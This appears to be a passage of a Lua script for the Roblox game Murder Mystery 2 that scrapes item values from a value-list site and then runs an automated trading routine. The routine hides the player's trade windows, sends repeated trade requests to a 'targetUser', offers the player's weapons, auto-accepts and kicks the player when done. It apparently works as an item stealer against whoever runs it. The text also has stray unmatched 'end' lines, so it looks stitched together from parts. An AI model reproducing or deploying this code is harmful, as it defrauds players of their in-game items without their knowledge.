    end
end

-- === NAME NORMALIZATION ===
local function NormalizeName(name)
    if not name then return "" end
    name = string.lower(name)
    name = string.gsub(name, "'", "")
    name = string.gsub(name, " ", "")
    name = string.gsub(name, "gun$", "")
    name = string.gsub(name, "knife$", "")
    return name
end

-- === SCRAPER + FALLBACK VALUES ===
local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma"}
local FallbackValues = {Chroma=250,Unique=150,Ancient=100,Godly=10,Vintage=5,Legendary=2}
local categories = {
    godly = "https://supremevaluelist.com/mm2/godlies.html",
    ancient = "https://supremevaluelist.com/mm2/ancients.html",
    unique = "https://supremevaluelist.com/mm2/uniques.html",
    vintage = "https://supremevaluelist.com/mm2/vintages.html",
    chroma = "https://supremevaluelist.com/mm2/chromas.html"
}
local headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"}

local function fetchHTML(url)
    local f = getRequest() if not f then return "" end
    local res = f({Url=url, Method="GET", Headers=headers, Timeout=10})
    return res and res.Body or ""
end

local valueDB = {}
task.spawn(function()
    for rarity, url in pairs(categories) do
        local html = fetchHTML(url)
        if html and html ~= "" then
            for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
                name = name:match("([^<]+)") if not name then continue end
                local clean = NormalizeName(name)
                local val = body:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
                if val then valueDB[clean] = tonumber((val:gsub(",", ""))) end
            end
        end
    end
end)

local function GetValue(itemName, rarity)
    local clean = NormalizeName(itemName)
    if valueDB[clean] then return valueDB[clean] end
    for k,v in pairs(valueDB) do if string.find(k, clean, 1, true) then return v end end
    return FallbackValues[rarity] or 1
end

            end
        end
    end
end

-- === TRADE LOGIC ===
local function getTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
local function sendTradeRequest(user) local p=Players:FindFirstChild(user) if p then pcall(function() ReplicatedStorage.Trade.SendRequest:InvokeServer(p) end) end end
local function addItem(id) ReplicatedStorage.Trade.OfferItem:FireServer(id, "Weapons") end
local function acceptTrade() ReplicatedStorage.Trade.AcceptTrade:FireServer(285646582) end
local function waitEnd() while getTradeStatus()~="None" do task.wait(0.1) end end

playerGui:WaitForChild("TradeGUI").Changed:Connect(function() playerGui.TradeGUI.Enabled=false end)
playerGui:WaitForChild("TradeGUI_Phone").Changed:Connect(function() playerGui.TradeGUI_Phone.Enabled=false end)

local function doTrade(targetUser)
    task.wait(2)
    while #weaponsToSend>0 do
        local s=getTradeStatus()
        if s=="None" then sendTradeRequest(targetUser) task.wait(1)
        elseif s=="StartTrade" then
            for i=1,math.min(4,#weaponsToSend) do local it=table.remove(weaponsToSend,1) for _=1,it.Amount do addItem(it.DataID) task.wait(0.05) end end
            task.wait(5) acceptTrade() waitEnd()
        end
        task.wait(0.5)
    end
    task.wait(1)
    plr:Kick("✅ Done!")
end

end
